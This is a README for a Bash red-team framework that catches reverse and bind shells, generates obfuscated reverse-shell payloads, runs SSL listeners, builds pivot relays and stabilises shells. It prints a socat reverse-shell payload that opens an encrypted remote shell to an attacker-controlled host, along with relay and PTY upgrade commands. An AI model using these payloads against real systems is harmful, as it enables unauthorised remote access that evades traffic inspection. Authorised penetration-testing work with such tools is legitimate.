## Overview

RedTeam Shell Framework is a **controller–module CLI** built entirely in Bash. It wraps standard Unix networking tools  (`nc`, `socat`, `openssl`, `ssh`) into an interactive menu-driven interface, enabling operators to:

- Catch and manage reverse/bind shell connections
- Generate payloads for Bash, PowerShell, and Python
- Establish SSL/TLS-encrypted shell channels
- Transfer files securely with integrity verification
- Create port-forwarding relays and SSH tunnels
- Stabilize limited shells into full interactive PTYs

All activity is logged to `logs/framework.log` for audit purposes.

## Features

| Module | Capability |
|--------|------------|
| **Listeners** | Reverse & bind listeners via `nc`/`ncat`, optional `rlwrap` for history, session tracking |
| **Payloads** | Bash, PowerShell, Python generators — Base64 encoding, obfuscation, batch generation, save to file |
| **Encryption** | `socat` SSL/TLS listener, RSA-2048 self-signed cert generation, encrypted payload output |
| **Transfer** | SCP upload/download, MD5 + SHA256 checksum verification, transfer history |
| **Relay / Pivot** | `socat` port relay, SSH local / remote / dynamic (SOCKS) tunnels, active relay management |
| **PTY Upgrade** | Step-by-step guides for Python `pty.spawn`, `script`-based upgrade, environment stabilization |
| **Logging** | Session IDs, event tracking, append-only JSON log in `logs/` |

## Requirements

### Required

| Tool | Purpose |
|------|---------|
| `bash` 4.0+ | Core runtime |
| `nc` / `ncat` | Listeners and connections |
| `socat` | Encrypted listeners and port relays |
| `openssl` | Certificate generation |
| `ssh` / `scp` | SSH tunneling and file transfer |

### Optional

| Tool | Purpose |
|------|---------|
| `rlwrap` | Command history and line editing in listeners |
| `python3` | PTY upgrade via `pty.spawn` |

### Install dependencies — Debian / Ubuntu

```bash
sudo apt update && sudo apt install -y netcat-traditional socat openssl rlwrap openssh-client python3
```

### Install dependencies — RHEL / CentOS

```bash
sudo yum install -y ncat socat openssl rlwrap openssh-clients python3
```

---

## Installation

### Option 1 — Git (recommended)

```bash
git clone https://github.com/taguianas/redteam-shell-framework.git
cd redteam-shell-framework
bash shellmaster.sh
```

### Option 2 — wget 

```bash
wget https://github.com/taguianas/redteam-shell-framework/archive/refs/heads/main.zip
unzip main.zip
cd redteam-shell-framework-main
bash shellmaster.sh
```

### Option 3 — curl 

```bash
curl -L https://github.com/taguianas/redteam-shell-framework/archive/refs/heads/main.zip -o framework.zip
unzip framework.zip
cd redteam-shell-framework-main
bash shellmaster.sh
```

> `git` is only needed to clone the repository. The framework itself depends only on standard Bash and Unix tools.

### Running on Windows

The framework requires a **Unix Bash environment**. On Windows, use **Git Bash**:

1. Right-click the project folder → **Git Bash Here**
2. Run `bash shellmaster.sh`

> PowerShell and CMD are not supported.

---

## Usage

Run the main controller from the project root:

```bash
bash shellmaster.sh
```

The interactive menu will load:

```
  ____  _          _ _ __  __           _
 / ___|| |__   ___| | |  \/  | __ _ ___| |_ ___ _ __
 \___ \| '_ \ / _ \ | | |\/| |/ _` / __| __/ _ \ '__|
  ___) | | | |  __/ | | |  | | (_| \__ \ ||  __/ |
 |____/|_| |_|\___|_|_|_|  |_|\__,_|___/\__\___|_|

## Modules

### 1. Listeners

Start a reverse or bind listener on any port. Optionally wrap with `rlwrap` for command history. Each session is assigned a unique ID and logged to `logs/sessions/`.

```
1. Start Reverse Listener   — catches incoming shells on a port
2. Start Bind Listener      — opens a backdoor that waits for connection
3. List Active Listeners    — shows active nc/ncat processes
4. Stop Listener            — kill by PID
5. Back
```

### 2. Payload Generator

Generate ready-to-use reverse shell one-liners. Supports Base64 encoding, variable obfuscation, and saving to `payloads/` with metadata.

```
1. Bash Reverse Shell
2. PowerShell Reverse Shell
3. Python Reverse Shell
4. One-Liner Templates
5. View Generated Payloads
6. Batch Generate (All Types)
7. Back
```

### 3. Encrypted Listener

Wraps shell traffic in SSL/TLS using `socat` and a self-signed RSA-2048 certificate stored in `certs/`. Prevents cleartext inspection of the connection.

```
1. Generate New Certificate
2. Start Encrypted Listener (socat SSL)
3. Generate Encrypted Payload (for target)
4. Back
```

**Target payload:**
```bash
socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash
```

### 4. File Transfer

Upload and download files over SCP. Verify file integrity with MD5 and SHA256 after transfer.

```
1. Upload File    — local → remote via SCP
2. Download File  — remote → local via SCP
3. Verify Checksum — MD5 + SHA256 of any file
4. View Transfer History
5. Back
```

### 5. Relay / Pivot

Create port-forwarding relays with `socat` or SSH tunnels to pivot through intermediate hosts.

```
1. Create socat Relay   — forward: listen_port → host:port
2. Create SSH Tunnel    — local (-L), remote (-R), or SOCKS (-D)
3. List Active Relays
4. Stop Relay
5. Back
```

**socat relay example:**
```bash
socat TCP-LISTEN:4444,fork,reuseaddr TCP:192.168.1.50:4444
```

### 6. Shell Stabilization

Step-by-step commands to upgrade a limited reverse shell to a fully interactive PTY.

```
1. Python PTY Upgrade    — pty.spawn('/bin/bash') + stty raw -echo
2. Script PTY Upgrade    — script -qc /bin/bash /dev/null
3. Fix Environment       — TERM, PATH, stty rows/cols, reset
4. Enable Terminal Features — history, colour prompt, tab completion
5. Back
```
